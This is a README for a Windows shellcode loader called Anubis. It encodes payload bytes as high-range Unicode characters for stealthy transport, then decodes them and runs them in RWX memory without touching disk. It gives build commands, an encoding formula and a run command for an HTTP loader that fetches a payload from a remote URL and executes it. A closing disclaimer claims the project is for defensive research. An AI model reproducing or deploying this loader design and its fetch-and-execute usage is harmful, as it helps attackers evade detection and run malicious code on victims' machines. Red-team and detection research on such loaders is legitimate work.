# 🛡️ Anubis Shellcode Loader

![Anubis Loader Banner](https://github.com/user-attachments/assets/95ba5347-a315-4737-b7be-95313f7650bc)



Anubis Loader is a Unicode‑based shellcode obfuscation and loading framework.  
It includes both a **Python obfuscator** and **Windows-native loaders** capable of decoding and executing Unicode‑encoded payloads from local files or HTTP sources.

---

## 🚀 Features

- **Unicode Shellcode Obfuscation**  
  Encodes raw shellcode bytes into high‑range Unicode characters for stealthy transport.

- **Local & Remote Loading**  
  Supports execution from local UTF‑8 encoded files or direct HTTP download.

- **In‑Memory Execution**  
  Allocates RWX memory, decodes bytes, and executes the payload without touching disk.

- **Surrogate-Pair Handling**  
  Proper decoding of multi‑byte UTF‑8 sequences and Unicode surrogate pairs.

---

## 📦 Components

### 🔹 Python Obfuscator  
`obfuscate.py` converts binary shellcode into a sequence of characters starting at Unicode base `0x13000`.

### 🔹 Local Loader  
Reads a UTF‑8 file, decodes the Unicode sequence, converts it back to bytes, and executes it from memory.

### 🔹 HTTP Loader  
Uses WinINet to fetch obfuscated Unicode data from a remote server, decode it, and execute in memory.

---

## 🛠️ Build Instructions

### Compile the Windows loader  
```bash
cl Anubis_loader.c /link wininet.lib
```
### Obfuscate shellcode
```bash
python obfuscate.py input.bin -o output.txt
```

### Run local loader
```bash
Anubis_loader.exe output.txt

```
### Run HTTP loader
```bash
Anubis_http_loader.exe https://example.com/payload.txt
```
----

## 📘 How It Works
Encoding
- Each shellcode byte is transformed into a Unicode code point:
```ini
encoded = 0x13000 + byte_value
```
- Transport
Encoded content is distributed as UTF‑8 text.

- Decoding
The loader reads each Unicode code point and subtracts the base offset to recover the original byte.

- Execution
Memory is allocated via VirtualAlloc, permissions updated via VirtualProtect, then executed.
----
⚠️ Disclaimer
This project is for defensive research, education, and authorized security testing only.
Execution of arbitrary shellcode can be harmful if misused.
